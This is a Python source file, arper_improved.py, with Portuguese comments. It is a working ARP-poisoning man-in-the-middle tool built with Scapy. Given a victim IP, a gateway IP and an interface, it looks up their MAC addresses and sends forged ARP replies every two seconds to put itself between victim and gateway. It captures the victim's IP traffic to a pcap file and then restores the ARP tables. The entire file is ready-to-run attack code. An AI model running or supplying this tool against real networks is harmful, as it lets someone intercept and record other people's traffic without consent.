
from multiprocessing import Process
from scapy.all import (conf, get_if_hwaddr, send, sniff, srp, wrpcap)
from scapy.layers.l2 import ARP, Ether

import os
import sys
import time
import signal

def get_mac(targetip, interface):
    try:
        # Envia um pacote ARP 'who-has' para o IP de destino
        # O dst='ff:ff:ff:ff:ff:ff' garante que o pacote seja enviado para broadcast
        packet = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(op="who-has", pdst=targetip)
        # srp envia e recebe pacotes na camada 2. timeout e retry para robustez.
        resp, _ = srp(packet, timeout=2, retry=10, verbose=False, iface=interface)

        # Verifica se houve resposta e retorna o MAC de origem
        if resp:
            for s, r in resp:
                return r[Ether].src
        return None
    except Exception as e:
        print(f"[ERRO] Erro ao obter MAC para {targetip}: {e}")
        return None

class Arper:
    def __init__(self, victim_ip, gateway_ip, interface='eth0'):
        self.victim_ip = victim_ip
        self.gateway_ip = gateway_ip
        self.interface = interface

        # Configura a interface da Scapy e desativa o modo verboso
        conf.iface = self.interface
        conf.verb = 0

        # Obtém os endereços MAC da vítima e do gateway
        self.victim_mac = get_mac(victim_ip, self.interface)
        self.gateway_mac = get_mac(gateway_ip, self.interface)

        if self.victim_mac is None:
            print(f"[ERRO] Não foi possível obter o MAC da vítima ({self.victim_ip}). Verifique o IP e a conectividade.")
            sys.exit(1)
        if self.gateway_mac is None:
            print(f"[ERRO] Não foi possível obter o MAC do gateway ({self.gateway_ip}). Verifique o IP e a conectividade.")
            sys.exit(1)

        print(f"[INFO] Interface '{self.interface}' inicializada.")
        print(f"[INFO] Gateway ({self.gateway_ip}) está em {self.gateway_mac}.")
        print(f"[INFO] Vítima ({self.victim_ip}) está em {self.victim_mac}.")
        print("-"*50)

        self.poison_thread = None
        self.sniff_thread = None

    def poison(self):
        # Cria pacotes ARP para envenenar a vítima e o gateway
        # Opcodes: 1 para request, 2 para reply
        # Envenenamento da vítima: diz à vítima que o atacante é o gateway
        poison_victim = ARP(
            op=2,  # ARP Reply
            psrc=self.gateway_ip,  # IP de origem (gateway)
            pdst=self.victim_ip,  # IP de destino (vítima)
            hwdst=self.victim_mac  # MAC de destino (vítima)
        )

        # Envenenamento do gateway: diz ao gateway que o atacante é a vítima
        poison_gateway = ARP(
            op=2,  # ARP Reply
            psrc=self.victim_ip,  # IP de origem (vítima)
            pdst=self.gateway_ip,  # IP de destino (gateway)
            hwdst=self.gateway_mac  # MAC de destino (gateway)
        )

        print(f"[INFO] Iniciando o envenenamento ARP entre {self.victim_ip} e {self.gateway_ip}. Pressione CTRL+C para parar.")

        while True:
            try:
                send(poison_victim, verbose=False)
                send(poison_gateway, verbose=False)
                sys.stdout.write('.')
                sys.stdout.flush()
                time.sleep(2)
            except KeyboardInterrupt:
                print("\n[INFO] Interrupção detectada. Restaurando tabelas ARP...")
                self.restore()
                break
            except Exception as e:
                print(f"\n[ERRO] Erro durante o envenenamento ARP: {e}")
                self.restore()
                break

    def restore(self):
        # Restaura as tabelas ARP enviando pacotes ARP corretos
        # Informa à vítima o MAC correto do gateway e vice-versa
        print("[INFO] Restaurando tabelas ARP...")
        send(
            ARP(
                op=2,  # ARP Reply
                psrc=self.gateway_ip,  # IP de origem (gateway)
                hwsrc=self.gateway_mac,  # MAC de origem (gateway)
                pdst=self.victim_ip,  # IP de destino (vítima)
                hwdst=self.victim_mac  # MAC de destino (vítima)
            ),
            count=7,  # Envia múltiplos pacotes para garantir a restauração
            verbose=False
        )
        send(
            ARP(
                op=2,  # ARP Reply
                psrc=self.victim_ip,  # IP de origem (vítima)
                hwsrc=self.victim_mac,  # MAC de origem (vítima)
                pdst=self.gateway_ip,  # IP de destino (gateway)
                hwdst=self.gateway_mac  # MAC de destino (gateway)
            ),
            count=7,  # Envia múltiplos pacotes para garantir a restauração
            verbose=False
        )
        print("[INFO] Tabelas ARP restauradas.")

    def sniff_packets(self, count=200):
        print(f"\n[INFO] Iniciando a captura de {count} pacotes na interface '{self.interface}'...")
        # Filtro BPF para capturar apenas tráfego IP da vítima
        bpf_filter = f"ip host {self.victim_ip}"
        try:
            packets = sniff(count=count, filter=bpf_filter, iface=self.interface, timeout=30) # Adicionado timeout
            wrpcap('arper.pcap', packets)
            print(f"[INFO] {len(packets)} pacotes capturados e salvos em 'arper.pcap'.")
        except Exception as e:
            print(f"[ERRO] Erro durante a captura de pacotes: {e}")
        finally:
            # Garante que a restauração seja chamada mesmo se a captura falhar
            if self.poison_thread and self.poison_thread.is_alive():
                self.poison_thread.terminate()
                self.poison_thread.join()
                print("[INFO] Processo de envenenamento ARP encerrado.")
            self.restore()
            print("[INFO] Captura de pacotes concluída.")

    def run(self):
        # Inicia os processos de envenenamento e captura em paralelo
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()

        # A captura de pacotes deve ser feita em um processo separado e ter um tempo limitado
        self.sniff_thread = Process(target=self.sniff_packets)
        self.sniff_thread.start()

        # Espera que os processos terminem
        self.poison_thread.join()
        self.sniff_thread.join()
        print("[INFO] Todos os processos foram concluídos.")


if __name__ == '__main__':
    if len(sys.argv) != 4:
        print("Uso: python3 arper_improved.py <IP_VITIMA> <IP_GATEWAY> <INTERFACE>")
        sys.exit(1)

    victim_ip = sys.argv[1]
    gateway_ip = sys.argv[2]
    interface = sys.argv[3]

    # Configura o tratamento de sinal para garantir a restauração em caso de interrupção externa
    def signal_handler(sig, frame):
        print("\n[INFO] Sinal de interrupção recebido. Encerrando...")
        if 'myarp' in locals() and myarp.poison_thread and myarp.poison_thread.is_alive():
            myarp.poison_thread.terminate()
            myarp.poison_thread.join()
        if 'myarp' in locals() and myarp.sniff_thread and myarp.sniff_thread.is_alive():
            myarp.sniff_thread.terminate()
            myarp.sniff_thread.join()
        if 'myarp' in locals():
            myarp.restore()
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)

    myarp = Arper(victim_ip, gateway_ip, interface)
    myarp.run()
